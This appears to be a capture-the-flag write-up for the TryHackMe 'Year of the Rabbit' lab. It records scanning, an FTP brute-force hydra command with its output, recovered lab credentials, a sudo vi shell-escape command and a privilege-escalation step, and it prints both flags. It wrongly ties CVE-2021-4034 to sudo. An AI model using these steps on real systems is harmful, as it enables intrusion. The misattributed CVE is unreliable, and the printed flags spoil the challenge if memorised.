## YearOfTheRabbit-thm

## Scanning Started
Apache version 2.4.10(Outdated)
  => Nmap:
## Openports: 
	   22 = ssh
	   80 = http
	   21 = ftp
## Directory Busting:
		assets => styles.css => /sup3r_s3cr3t_fl4g.php
	 	The secret Directory will be found by burp suite in one the responses
	 	secret Directory: /WExYY2Cv-qU => Hot_babe.png => crack using strings

#	 strings Hot_babe.png =>
a username = ftpuser
and a number of passwords.



##	Used Hydra to Crack FTP using Credentials from the hidden Directory

		hydra -l ftpuser -P passwords ftp://10.10.103.7


	[21][ftp] host: 10.10.103.7   login: ftpuser   password: 5iez1wGXKfPKQ

## And therefore Discovered a new set of Languages BrainF*ck
	Go online Search a good compiler for the language
	Result:

	User: eli

	Password: DSpDiM1wAEwid


# Linux Priv 

Ran linpeas.sh

## Possible Exploits:
	1) Sudo version 1.8.10p3 

	=> Vulnerable to CVE-2021-4034





	2) Found an Interesting File

	-rw-r--r-- 1 root root 138 Jan 23  2020 /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

## Password For Gwendoline Found in 
	/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

"Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just *MniVCQVhQHUNI*
Honestly!

Yours sincerely
   -Root"

## Flag => user.txt
	THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

## Linux priv esc from Gwen's ID



	sudo /usr/bin/vi -c ':!/bin/sh' /dev/null (Tried but was not a success)

	So as a last resort Performed the CVE-2021-4034



## root.txt
	THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
